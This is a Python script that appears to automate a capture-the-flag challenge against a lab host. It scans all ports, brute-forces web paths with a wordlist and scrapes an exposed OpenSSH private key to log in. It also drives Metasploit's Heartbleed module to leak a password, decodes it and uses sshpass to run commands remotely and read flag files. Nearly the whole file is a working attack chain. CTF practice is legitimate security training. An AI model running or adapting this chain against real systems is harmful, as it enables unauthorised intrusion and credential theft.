import socket
import requests
import re
import subprocess
import sys
import nmap
import requests
import re
import subprocess
import pexpect
import re
import base64

ipAddr = "10.200.32.177"


def flag1():
    ports = range(1, 2**16)
    open_ports = []

    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ipAddr, port))
        if result == 0:
            open_ports.append(port)
        sock.close()

    for port in open_ports:
        url = f"http://{ipAddr}:{port}/"
        try:
            response = requests.get(url)
            if "flag1{" in response.text:
                
                # Using regex to find the flag
                flag_match = re.search(r'flag1\{.*\}', response.text)
                if flag_match:
                    print(flag_match.group())
                return port,open_ports
        except requests.RequestException as e:
            pass


def flag2(port):
    wordList = "words.txt"

    pattern = r'flag2{.*}'
    pattern2 = r'(?s)-----BEGIN OPENSSH PRIVATE KEY-----(.*?)-----END OPENSSH PRIVATE KEY-----'


    with open(wordList, 'r') as f:
        paths = f.read().splitlines()

        for path in paths:
            full_url = f"http://{ipAddr}:{port}/{path}"
            try:
                response = requests.get(full_url)
                if response.status_code == 200:
                    match = re.search(pattern, response.text)
                    if match:
                        matched_word = match.group(0)
                        print(matched_word)
                allMatches = re.search(pattern2, response.text)
                if allMatches:
                    key_content = allMatches.group(1).strip()
                    with open("flag3key.pem", 'w') as key_file:
                        key_file.write("-----BEGIN OPENSSH PRIVATE KEY-----\n")
                        key_file.write(key_content + '\n')
                        key_file.write("-----END OPENSSH PRIVATE KEY-----\n")

            except requests.exceptions.RequestException as e:
                print(f"Error accessing {full_url}: {e}")


def flag3():
    key_filename = "flag3key.pem"
    command = "cat flag3.txt"  

    # Change permissions of the key.pem file to 600
    chmod_command = ["chmod", "600", key_filename]

    # SSH command
    ssh_command = [
        "ssh",
        "-i",
        key_filename,
        f"ns@{ipAddr}",
        command
    ]

    # Run chmod command
    chmod_result = subprocess.run(chmod_command, capture_output=True, text=True)

    # Check if chmod command was successful
    if chmod_result.returncode != 0:
        print("Error changing permissions of key file.")
        print(chmod_result.stderr)
    else:
        # Run the SSH command
        ssh_result = subprocess.run(ssh_command, capture_output=True, text=True)

        # Check if the SSH command was successful
        if ssh_result.returncode == 0:
            output = ssh_result.stdout
        else:
            output = ssh_result.stderr

        print(output)



def port400(target_ip,listOfOpenPorts):
    for port in listOfOpenPorts:
        url = f"http://{target_ip}:{port}/"
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 400:
                return port
        except requests.exceptions.RequestException as e:
            pass
    return None



def heartBleed(target_port, output_file):
    try:
        # Start msfconsole with logging enabled
        with open(output_file, "w") as f:
            msfconsole = pexpect.spawn("msfconsole", encoding="utf-8", logfile=f)

            # Wait for msfconsole to start
            msfconsole.expect_exact("[?1034h[4mmsf6[0m [0m> ")

            # Send commands to msfconsole
            msfconsole.sendline("use auxiliary/scanner/ssl/openssl_heartbleed")
            msfconsole.expect_exact("[0m[4mmsf6[0m auxiliary([1m[31mscanner/ssl/openssl_heartbleed[0m) [0m> ")

            msfconsole.sendline(f"set RHOST {ipAddr}")
            msfconsole.expect_exact("[4mmsf6[0m auxiliary([1m[31mscanner/ssl/openssl_heartbleed[0m) [0m> ")

            msfconsole.sendline(f"set RPORT {target_port}")
            msfconsole.expect_exact("[4mmsf6[0m auxiliary([1m[31mscanner/ssl/openssl_heartbleed[0m) [0m> ")

            msfconsole.sendline("set VERBOSE true")
            msfconsole.expect_exact("[4mmsf6[0m auxiliary([1m[31mscanner/ssl/openssl_heartbleed[0m) [0m> ")

            msfconsole.sendline("run")
            
            # Wait for the command to finish
            msfconsole.expect_exact("[4mmsf6[0m auxiliary([1m[31mscanner/ssl/openssl_heartbleed[0m) [0m> ")

            # Close msfconsole
            msfconsole.sendline("exit")

        # Read the output from the file
        with open(output_file, "r") as f:
            output = f.read()

        # Regular expression pattern to find the password in the output
        password_pattern = r"password=([A-Za-z0-9+/=]+)"

        # Search for the password pattern in the output
        password_match = re.search(password_pattern, output)

        if password_match:
            return base64.b64decode(base64.b64decode(password_match.group(1)).decode("utf-8")).decode("utf-8")
        else:
            print("Password not found in the output.")  
            return None

    except pexpect.exceptions.ExceptionPexpect:
        pass
        return None
    

def flag4(password):
    try:
        ssh_command = f'sshpass -p "{password}" ssh hacker@{ipAddr} "cd home/ns && cat flag4.txt"'
        # Use subprocess.run() to execute the SSH command
        result = subprocess.run(ssh_command, shell=True, capture_output=True, text=True, check=True)
        print(result.stdout)

    except subprocess.CalledProcessError as e:
        pass

port,listOfports = flag1()
print()
flag2(3047)
print()
flag3()
flag4(heartBleed(port400(ipAddr,listOfports),"log.txt"))